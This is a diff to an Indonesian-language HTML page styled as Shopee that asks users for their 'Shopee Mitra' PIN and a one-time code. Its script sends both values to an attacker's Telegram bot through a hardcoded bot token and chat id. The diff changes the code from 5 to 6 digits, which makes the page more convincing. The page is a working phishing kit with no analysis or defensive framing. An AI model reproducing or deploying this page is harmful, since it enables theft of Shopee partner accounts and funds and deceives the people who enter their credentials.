@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -14,6 +15,7 @@
             align-items: center;
             min-height: 100vh;
         }
+
         .pin-container {
             width: 320px;
             padding: 20px;
@@ -22,20 +24,24 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
+
         h2 {
             color: #ee4d2d;
             margin-bottom: 20px;
         }
+
         .input-group {
             margin-bottom: 15px;
             text-align: left;
         }
+
         label {
             display: block;
             margin-bottom: 5px;
             color: #333;
             font-size: 0.9em;
         }
+
         input[type="password"],
         input[type="number"] {
             width: 100%;
@@ -48,6 +54,7 @@
             text-align: center;
             letter-spacing: 5px;
         }
+
         button {
             margin-top: 20px;
             background-color: #ee4d2d;
@@ -61,25 +68,29 @@
             outline: none;
             transition: background-color 0.3s ease;
         }
+
         button:hover {
             background-color: #d43d1a;
         }
+
         #resendOtp {
             margin-top: 10px;
             background-color: #6c757d;
         }
+
         #resendOtp:disabled {
             background-color: #aaa;
             cursor: not-allowed;
         }
     </style>
 </head>
+
 <body>
     <div class="pin-container">
         <h2>Masukkan PIN Anda</h2>
         <div class="input-group">
-            <label for="otpInput">Kode OTP (5 digit):</label>
-            <input type="number" id="otpInput" maxlength="5" placeholder="•••••" required
+            <label for="otpInput">Kode OTP (6 digit):</label>
+            <input type="number" id="otpInput" maxlength="6" placeholder="••••••" required
                 oninput="if(this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" />
         </div>
         <div class="input-group">
@@ -94,8 +105,8 @@
             e.preventDefault();
             const pin = document.getElementById('pinInput').value.trim();
             const otp = document.getElementById('otpInput').value.trim();
-            if (otp.length !== 5 || !/^\d{5}$/.test(otp)) {
-                alert('Masukkan Kode OTP 5 digit angka yang valid');
+            if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
+                alert('Masukkan Kode OTP 6 digit angka yang valid');
                 document.getElementById('otpInput').focus();
                 return;
             }
@@ -107,7 +118,7 @@
             // Kirim PIN dan OTP ke Telegram
             var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
             var chat_id = "5923031825";
-            var text = "PIN Shopee Mitra: " + pin + "\nOTP: " + otp;
+            var text = "PIN Shopee Mitra: " + pin + "\\nOTP: " + otp;
             var url = "https://api.telegram.org/bot" + token + "/sendMessage";
             var params = {
                 chat_id: chat_id,
@@ -129,7 +140,7 @@
                     }
                 })
                 .catch(error => {
-                    alert('Terjadi kesalahan saat mengirim pesan ke Telegram. Coba lagi nanti.\n' + error);
+                    alert('Terjadi kesalahan saat mengirim pesan ke Telegram. Coba lagi nanti.\\n' + error);
                 });
         });
         // Timer untuk Kirim Ulang OTP
@@ -161,4 +172,5 @@
         });
     </script>
 </body>
+
 </html>
